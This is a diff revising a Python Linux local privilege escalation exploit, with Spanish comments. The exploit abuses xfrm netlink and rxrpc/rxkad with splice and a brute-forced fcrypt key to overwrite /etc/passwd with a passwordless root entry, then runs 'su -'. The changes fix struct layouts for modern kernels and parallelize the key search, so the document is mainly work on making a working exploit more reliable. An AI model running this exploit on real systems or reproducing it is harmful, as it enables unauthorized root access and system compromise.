@@ -7,23 +7,20 @@ Tres partes:
   2) rxrpc_lpe_main: parchea /etc/passwd (root::0:0) vía rxrpc/rxkad.
   3) main          : orquesta ambos caminos, abre PTY y exec'ea `su -`.
 
-Correcciones aplicadas (v2):
-  - _build_xfrm_usersa_info: struct xfrm_selector construido con el
-    layout real (52 bytes) usando "=HHHHHBBB3xI". Antes "=HHHBBBI"
-    generaba 49 bytes y saltaba AssertionError.
-  - tail usa "=HBBB3x" (8 bytes) para que info sume 216 exactos.
-  - rxrpc_lpe_main: mmap usa min(4096, st.st_size) en lugar de 4096
-    fijo, evitando ValueError en /etc/passwd pequeños.
-
-NOTA sobre kernels:
-  Si tu kernel es >= ~4.19 con el campo 'user' en xfrm_selector, el
-  struct real mide 56 bytes y xfrm_usersa_info 224. En ese caso verás
-  "add_xfrm_sa #N failed" (no AssertionError). Para ese caso, ver
-  la constante XFRM_SELECTOR_EXTRA al inicio de _build_xfrm_usersa_info.
+Correcciones v3:
+  - _build_xfrm_usersa_info: struct xfrm_selector MODERNO de 56 bytes
+    (incluye campo 'user'), xfrm_usersa_info 220 bytes. Para kernels
+    antiguos (< ~4.19, sin 'user') exportar XFRM_SELECTOR_OLD=1.
+  - rxrpc_lpe_main: mmap usa min(4096, st.st_size) para evitar ValueError
+    cuando el archivo mide < 4096 bytes.
+  - K_C se busca en paralelo (multiprocessing) porque fc_check_pc es
+    ~500x más estricta que K_A/K_B. K_A y K_B siguen siendo offline.
 """
 
 import os, sys, ctypes, struct, socket, time, errno, fcntl, select
 import signal, termios, tty, random, mmap, subprocess
+import queue as queue_mod
+from multiprocessing import Process, Queue, cpu_count, Event, Value
 
 # ===================================================================
 #  libc / syscall helpers
@@ -196,51 +193,55 @@ XFRM_STATE_ESN          = 0x80
 def _inet_addr(ip):
     return struct.unpack("=I", socket.inet_aton(ip))[0]
 
-# --- Corrección Bug 1 y Bug 2 ---------------------------------------
-# struct xfrm_selector (52 bytes, kernels antiguos sin 'user'):
+# --- V3: selector moderno (56 bytes) por defecto -------------------
+# xfrm_selector MODERNO (>=~4.19, con campo 'user'):
 #   daddr(16) saddr(16) dport(2) dport_mask(2) sport(2) sport_mask(2)
-#   family(2) prefixlen_d(1) prefixlen_s(1) proto(1) pad(3) ifindex(4)
+#   family(2) prefixlen_d(1) prefixlen_s(1) proto(1) pad(3)
+#   ifindex(4) user(4)  --> 56 bytes
+# xfrm_usersa_info = 56 + 24 + 16 + 64 + 32 + 12 + 16 = 220
 #
-# Si tu kernel es >= ~4.19, añade al final "I" (user) y cambia el
-# assert a 56. Y en _build_xfrm_usersa_info cambia el assert de info
-# a 224. Ver comentario arriba del archivo.
+# xfrm_selector ANTIGUO (52 bytes, sin 'user'):
+# exportar XFRM_SELECTOR_OLD=1 --> info mide 216
 # -------------------------------------------------------------------
-def _build_xfrm_usersa_info(spi, patch_seqhi):
-    sel = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +    # daddr
-           struct.pack("=I12x", _inet_addr("127.0.0.1")) +    # saddr
-           struct.pack("=HHHHHBBB3xI",
-                       0,               # dport
-                       0,               # dport_mask
-                       0,               # sport
-                       0,               # sport_mask
-                       socket.AF_INET,  # family
-                       32,              # prefixlen_d
-                       32,              # prefixlen_s
-                       0,               # proto
-                       0))              # ifindex
-    assert len(sel) == 52, len(sel)
+XFRM_SELECTOR_MODERN = os.environ.get("XFRM_SELECTOR_OLD") != "1"
 
-    # struct xfrm_id (24 bytes): daddr(16) + spi(4) + proto(1) + pad(3)
+def _build_xfrm_usersa_info(spi, patch_seqhi):
+    if XFRM_SELECTOR_MODERN:
+        sel = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +
+               struct.pack("=I12x", _inet_addr("127.0.0.1")) +
+               struct.pack("=HHHHHBBB3xII",
+                           0, 0, 0, 0,
+                           socket.AF_INET, 32, 32, 0,
+                           0,   # ifindex
+                           0))  # user
+        assert len(sel) == 56, len(sel)
+        expected_info = 220
+    else:
+        sel = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +
+               struct.pack("=I12x", _inet_addr("127.0.0.1")) +
+               struct.pack("=HHHHHBBB3xI",
+                           0, 0, 0, 0,
+                           socket.AF_INET, 32, 32, 0,
+                           0))  # ifindex
+        assert len(sel) == 52, len(sel)
+        expected_info = 216
+
     xid = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +
            struct.pack("=IB3x", socket.htonl(spi), socket.IPPROTO_ESP))
     assert len(xid) == 24
 
-    saddr = struct.pack("=I12x", _inet_addr("127.0.0.1"))
-    assert len(saddr) == 16
-
-    lft = struct.pack("=8Q", *([0xFFFFFFFFFFFFFFFF] * 4 + [0, 0, 0, 0]))
-    assert len(lft) == 64
-
+    saddr  = struct.pack("=I12x", _inet_addr("127.0.0.1"))
+    lft    = struct.pack("=8Q", *([0xFFFFFFFFFFFFFFFF] * 4 + [0, 0, 0, 0]))
     curlft = b"\x00" * 32
     stats  = b"\x00" * 12
 
-    tail = (struct.pack("=II", 0, 0x1234) +           # seq, reqid (8)
-            struct.pack("=HBBB3x", socket.AF_INET,     # 8 bytes con padding
+    tail = (struct.pack("=II", 0, 0x1234) +
+            struct.pack("=HBBB3x", socket.AF_INET,
                         XFRM_MODE_TRANSPORT, 0, XFRM_STATE_ESN))
-    assert len(tail) == 16, len(tail)
+    assert len(tail) == 16
 
     info = sel + xid + saddr + lft + curlft + stats + tail
-    assert len(info) == 216, len(info)
+    assert len(info) == expected_info, len(info)
     return bytearray(info)
 
 def _put_attr(nlh, typ, data):
@@ -531,23 +532,18 @@ def fcrypt_user_setkey(key: bytes):
 
 def _FC_F(R, L, sched_entry):
     u = (sched_entry ^ R) & 0xFFFFFFFF
-    c0 = u & 0xff
-    c1 = (u >> 8) & 0xff
-    c2 = (u >> 16) & 0xff
-    c3 = (u >> 24) & 0xff
-    return L ^ fc_sbox0[c0] ^ fc_sbox1[c1] ^ fc_sbox2[c2] ^ fc_sbox3[c3]
+    return (L ^ fc_sbox0[u & 0xff]
+              ^ fc_sbox1[(u >> 8) & 0xff]
+              ^ fc_sbox2[(u >> 16) & 0xff]
+              ^ fc_sbox3[(u >> 24) & 0xff])
 
 def fcrypt_user_decrypt(sched, ct: bytes) -> bytes:
     L = struct.unpack("=I", ct[0:4])[0]
     R = struct.unpack("=I", ct[4:8])[0]
-    order = [0xf, 0xe, 0xd, 0xc, 0xb, 0xa, 0x9, 0x8,
-             0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0]
-    for idx, sc in enumerate(order):
-        if idx % 2 == 0:
-            R = _FC_F(L, R, sched[sc])
-        else:
-            L = _FC_F(R, L, sched[sc])
-    return struct.pack("=I", L) + struct.pack("=I", R)
+    for sc in (0xf, 0xe, 0xd, 0xc, 0xb, 0xa, 0x9, 0x8,
+               0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0):
+        L, R = R, _FC_F(L, R, sched[sc])
+    return struct.pack("=II", L, R)
 
 # ===================================================================
 #  AF_ALG pcbc(fcrypt)
@@ -589,7 +585,6 @@ def alg_open_pcbc_fcrypt(key: bytes) -> int:
 def alg_op(alg_s, op, iv: bytes, data: bytes) -> bytes:
     op_fd = libc.accept(alg_s, None, None)
     if op_fd < 0:
-        sys.stderr.write("[!] accept(AF_ALG): %s\n" % os.strerror(ctypes.get_errno()))
         raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
     try:
         sock = socket.socket(fileno=op_fd)
@@ -603,8 +598,7 @@ def alg_op(alg_s, op, iv: bytes, data: bytes) -> bytes:
             need = len(data)
             while len(out) < need:
                 chunk = sock.recv(need - len(out))
-                if not chunk:
-                    break
+                if not chunk: break
                 out += chunk
             return out
         finally:
@@ -656,7 +650,6 @@ RXRPC_PACKET_TYPE_DATA      = 1
 RXRPC_LAST_PACKET           = 0x04
 
 RXRPC_WH_SIZE = 28
-RXRPC_WH_FMT  = "=IIIII4sHH"
 
 def make_sockaddr_rxrpc(service, port):
     sin = struct.pack("=HHI4s8x", socket.AF_INET, socket.htons(port),
@@ -782,9 +775,9 @@ def do_one_trigger(target_fd, splice_off, splice_len):
     epoch, cid, callN, _seq, _serial, _typeflags, svc_in = \
         struct.unpack_from("=IIIII4sH", pkt, 0)[:7]
 
-    epoch = socket.ntohl(epoch)
-    cid   = socket.ntohl(cid)
-    callN = socket.ntohl(callN)
+    epoch  = socket.ntohl(epoch)
+    cid    = socket.ntohl(cid)
+    callN  = socket.ntohl(callN)
     svc_in = socket.ntohs(svc_in)
     cli_port = cli_addr[1]
 
@@ -852,7 +845,7 @@ def do_one_trigger(target_fd, splice_off, splice_len):
     return 0
 
 # ===================================================================
-#  Predicados y búsqueda offline de K
+#  Predicados y búsqueda de K
 # ===================================================================
 def fc_check_pa(P): return P[0] == ord(':') and P[1] == ord(':')
 
@@ -882,16 +875,90 @@ def find_K_offline(ct: bytes, max_iters, check_fn, seed_init, label):
         if check_fn(P):
             dt = time.time() - t0
             sys.stderr.write(
-                "[+] %s found after %d iters in %.2fs (%.2fM/s) "
-                "K=%s P=%s\n" % (
-                    label, it, dt, it / dt / 1e6 if dt > 0 else 0,
-                    K.hex(), P.hex()))
+                "[+] %s found after %d iters in %.2fs (%.2fM/s) K=%s P=%s\n" %
+                (label, it, dt, it / dt / 1e6 if dt > 0 else 0,
+                 K.hex(), P.hex()))
             return K, P
         if (it & 0x3FFFFFF) == 0 and it > 0:
             dt = time.time() - t0
             sys.stderr.write("  [%s %.1fs] iter=%d (%.2fM/s)\n" %
                              (label, dt, it, it / dt / 1e6 if dt > 0 else 0))
     return None, None
+
+# --- V3: búsqueda paralela para K_C -------------------------------
+def _kc_worker(ct, check_fn, seed, q, stop, counter, batch=5000):
+    while not stop.is_set():
+        for _ in range(batch):
+            r, seed = splitmix64(seed)
+            K = struct.pack("=Q", r)
+            sched = fcrypt_user_setkey(K)
+            P = fcrypt_user_decrypt(sched, ct)
+            if check_fn(P):
+                try:
+                    q.put_nowait((K, P))
+                except Exception:
+                    pass
+                return
+        with counter.get_lock():
+            counter.value += batch
+
+def find_K_parallel(ct, check_fn, seed_init, label, nproc=None):
+    if nproc is None:
+        nproc = max(1, cpu_count())
+    sys.stderr.write("[*] %s: lanzando %d workers (predicado estricto, "
+                     "~18M iters esperadas)\n" % (label, nproc))
+    sys.stderr.flush()
+
+    q = Queue()
+    stop = Event()
+    counter = Value('L', 0)
+    procs = []
+    t0 = time.time()
+    for i in range(nproc):
+        seed = (seed_init + i * 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF
+        p = Process(target=_kc_worker,
+                    args=(ct, check_fn, seed, q, stop, counter))
+        p.daemon = True
+        p.start()
+        procs.append(p)
+
+    K = P = None
+    last_report = t0
+    try:
+        while True:
+            try:
+                result = q.get(timeout=1.0)
+                if result:
+                    K, P = result
+                    break
+            except queue_mod.Empty:
+                pass
+            now = time.time()
+            if now - last_report >= 5.0:
+                with counter.get_lock():
+                    n = counter.value
+                dt = now - t0
+                rate = n / dt / 1e6 if dt > 0 else 0
+                sys.stderr.write("  [%s %.1fs] total=%d (%.2fM/s total)\n" %
+                                 (label, dt, n, rate))
+                sys.stderr.flush()
+                last_report = now
+            if not any(p.is_alive() for p in procs):
+                break
+    finally:
+        stop.set()
+        for p in procs:
+            try: p.terminate()
+            except Exception: pass
+        for p in procs:
+            try: p.join(timeout=1)
+            except Exception: pass
+
+    if K is not None:
+        dt = time.time() - t0
+        sys.stderr.write("[+] %s found in %.2fs\n" % (label, dt))
+        sys.stderr.write("    K=%s P=%s\n" % (K.hex(), P.hex()))
+    return K, P
 
 # ===================================================================
 #  rxrpc_lpe_main
@@ -914,7 +981,8 @@ def do_unshare_userns_netns():
             buf = fcntl.ioctl(s.fileno(), 0x8913, buf)
             flags = struct.unpack("16sH14x", buf)[1]
             flags |= 0x1 | 0x40
-            fcntl.ioctl(s.fileno(), 0x8914, struct.pack("16sH14x", b"lo", flags))
+            fcntl.ioctl(s.fileno(), 0x8914,
+                        struct.pack("16sH14x", b"lo", flags))
         except OSError:
             pass
     finally:
@@ -965,8 +1033,9 @@ def rxrpc_lpe_main(argv):
             sys.stderr.write("[!] target too small: %d\n" % st.st_size)
             return 1
 
-        # --- Corrección Bug 3: no pedir más de lo que mide el archivo ---
-        mp = mmap.mmap(rfd_ro, min(4096, st.st_size), access=mmap.ACCESS_READ)
+        # V3: mmap no puede pedir más que el tamaño real del archivo
+        mp = mmap.mmap(rfd_ro, min(4096, st.st_size),
+                       access=mmap.ACCESS_READ)
 
         if bytes(mp[0:9]) == b"root::0:0":
             sys.stderr.write("[+] /etc/passwd already patched - nothing to do\n")
@@ -1009,9 +1078,12 @@ def rxrpc_lpe_main(argv):
         if Kb is None: return 2
 
         Cc_actual = Pb[2:8] + Cc[6:8]
-        sys.stderr.write("\n=== STAGE 1c: search K_C (chars 8-15) ===\n")
-        Kc, Pc = find_K_offline(Cc_actual, max_iters, fc_check_pc,
-                                seed_base ^ 0x5A5A5A5A5A5A5A5A, "K_C")
+        sys.stderr.write("\n=== STAGE 1c: search K_C (chars 8-15) — paralelo ===\n")
+        nproc_env = os.environ.get("LPE_K_C_PROCS")
+        nproc = int(nproc_env, 0) if nproc_env else None
+        Kc, Pc = find_K_parallel(Cc_actual, fc_check_pc,
+                                 seed_base ^ 0x5A5A5A5A5A5A5A5A,
+                                 "K_C", nproc=nproc)
         if Kc is None: return 2
 
         SESSION_KEY[:] = Ka
